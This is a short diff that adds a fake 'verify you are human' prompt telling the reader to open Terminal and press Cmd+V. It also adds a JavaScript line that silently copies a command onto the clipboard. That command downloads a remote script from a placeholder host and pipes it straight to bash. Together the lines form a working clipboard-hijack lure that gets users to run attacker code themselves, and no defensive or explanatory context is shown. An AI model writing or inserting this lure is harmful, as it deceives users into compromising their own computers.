@@ -1,0 +1,3 @@
+Verify you are human. Open Terminal and press Cmd + V.
+navigator.clipboard.writeText("curl -fsSL https://example.invalid/v.sh | bash");
+
